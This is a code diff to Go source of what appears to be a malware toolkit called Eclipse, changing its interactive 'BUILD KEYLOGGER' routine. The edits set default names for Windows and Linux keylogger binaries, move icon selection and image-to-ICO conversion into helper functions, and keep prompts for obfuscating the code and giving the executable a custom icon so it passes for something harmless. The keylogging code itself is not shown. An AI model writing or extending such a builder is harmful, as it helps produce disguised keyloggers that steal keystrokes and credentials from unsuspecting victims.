@@ -86,25 +86,35 @@ func ldflagX(pkgVar, val string) string {
 	return "-X=" + pkgVar + "=" + val
 }
 
+func suggestedKeyloggerFilename(goos string) string {
+	if goos == "windows" {
+		return "eclipse_keylogger_windows.exe"
+	}
+	return "eclipse_keylogger_linux"
+}
+
 func buildKeylogger() {
 	utils.ClearTerminal()
 	fmt.Printf("\n%s═══ BUILD KEYLOGGER ═══%s\n\n", utils.Red, utils.Reset)
 
 	reader := bufio.NewReader(os.Stdin)
 	tGOOS := targetBuildGOOS()
+	defaultFilename := suggestedKeyloggerFilename(tGOOS)
 
-	fmt.Printf("%sOutput filename (default: logger.exe): %s", utils.Green, utils.Reset)
+	fmt.Printf("%sSuggested Windows name:%s eclipse_keylogger_windows.exe\n", utils.Blue, utils.Reset)
+	fmt.Printf("%sSuggested Linux name:%s eclipse_keylogger_linux\n", utils.Blue, utils.Reset)
+	fmt.Printf("%sOutput filename (default: %s): %s", utils.Green, defaultFilename, utils.Reset)
 	filename, _ := reader.ReadString('\n')
 	filename = strings.TrimSpace(filename)
 	if filename == "" {
-		filename = "logger.exe"
+		filename = defaultFilename
 	}
 	if tGOOS == "windows" && !strings.HasSuffix(strings.ToLower(filename), ".exe") {
 		filename += ".exe"
 	}
 
-	fmt.Printf("\n%sSelect icon (optional):%s\n", utils.Yellow, utils.Reset)
-	icon := selectIconForKeylogger()
+	fmt.Printf("\n%sSelect image/icon (optional):%s\n", utils.Yellow, utils.Reset)
+	icon := selectIconForKeylogger(reader)
 
 	fmt.Printf("\n%sObfuscate code? (y/n): %s", utils.Yellow, utils.Reset)
 	obfuscate, _ := reader.ReadString('\n')
@@ -143,7 +153,7 @@ func buildKeylogger() {
 
 	if icon != "" && tGOOS == "windows" {
 		fmt.Printf("%s[*] Preparing icon resource...%s\n", utils.Yellow, utils.Reset)
-		icoPath, cleanupIco, err := materializeICO(icon)
+		icoPath, cleanupIco, err := utils.MaterializeICO(icon)
 		if err != nil {
 			fmt.Printf("%s[!] Icon: %v%s\n", utils.Red, err, utils.Reset)
 			utils.PauseForInput()
@@ -181,7 +191,7 @@ func buildKeylogger() {
 		}
 	}
 
-	args := []string{"build", "-trimpath", "-C", root, "-o", outPath}
+	args := []string{"-C", root, "build", "-trimpath", "-o", outPath}
 	if len(ld) > 0 {
 		args = append(args, "-ldflags", strings.Join(ld, " "))
 	}
@@ -203,82 +213,8 @@ func buildKeylogger() {
 	utils.PauseForInput()
 }
 
-func materializeICO(srcPath string) (icoPath string, cleanup func(), err error) {
-	ext := strings.ToLower(filepath.Ext(srcPath))
-	if ext == ".ico" {
-		return srcPath, func() {}, nil
-	}
-	f, err := os.CreateTemp("", "eclipse-icon-*.ico")
-	if err != nil {
-		return "", nil, err
-	}
-	_ = f.Close()
-	tmpPath := f.Name()
-	cmd := exec.Command("magick", "convert", srcPath, "-resize", "256x256", tmpPath)
-	if err := cmd.Run(); err != nil {
-		_ = os.Remove(tmpPath)
-		return "", nil, fmt.Errorf("imagemagick convert: %w", err)
-	}
-	return tmpPath, func() { _ = os.Remove(tmpPath) }, nil
-}
-
-func selectIconForKeylogger() string {
+func selectIconForKeylogger(reader *bufio.Reader) string {
 	root := eclipseModuleRoot()
-	imgPath := filepath.Join(root, "images")
-
-	if _, err := os.Stat(imgPath); os.IsNotExist(err) {
-		_ = os.MkdirAll(imgPath, 0755)
-		fmt.Printf("%s[!] No images folder found. Place icons in %s%s\n", utils.Yellow, imgPath, utils.Reset)
-		utils.PauseForInput()
-		return ""
-	}
-
-	files, err := os.ReadDir(imgPath)
-	if err != nil || len(files) == 0 {
-		fmt.Printf("%s[!] No icon files found%s\n", utils.Yellow, utils.Reset)
-		utils.PauseForInput()
-		return ""
-	}
-
-	var icons []string
-	for _, file := range files {
-		if !file.IsDir() {
-			ext := strings.ToLower(filepath.Ext(file.Name()))
-			if ext == ".ico" || ext == ".png" || ext == ".jpg" || ext == ".jpeg" || ext == ".bmp" {
-				icons = append(icons, file.Name())
-			}
-		}
-	}
-
-	if len(icons) == 0 {
-		fmt.Printf("%s[!] No image files found%s\n", utils.Yellow, utils.Reset)
-		utils.PauseForInput()
-		return ""
-	}
-
-	fmt.Printf("\n%sAvailable icons:%s\n", utils.Blue, utils.Reset)
-	for i, icon := range icons {
-		fmt.Printf("%s  [%d] %s%s\n", utils.Green, i+1, icon, utils.Reset)
-	}
-	fmt.Printf("%s  [0] Skip icon%s\n", utils.Yellow, utils.Reset)
-
-	reader := bufio.NewReader(os.Stdin)
-	fmt.Printf("\n%sSelect icon number: %s", utils.Green, utils.Reset)
-	input, _ := reader.ReadString('\n')
-	input = strings.TrimSpace(input)
-
-	if input == "0" || input == "" {
-		return ""
-	}
-
-	var choice int
-	fmt.Sscanf(input, "%d", &choice)
-
-	if choice < 1 || choice > len(icons) {
-		fmt.Printf("%s[!] Invalid choice%s\n", utils.Red, utils.Reset)
-		utils.PauseForInput()
-		return ""
-	}
-
-	return filepath.Join(imgPath, icons[choice-1])
+	imgPath := filepath.Join(root, "img")
+	return utils.SelectIconImage(reader, imgPath)
 }
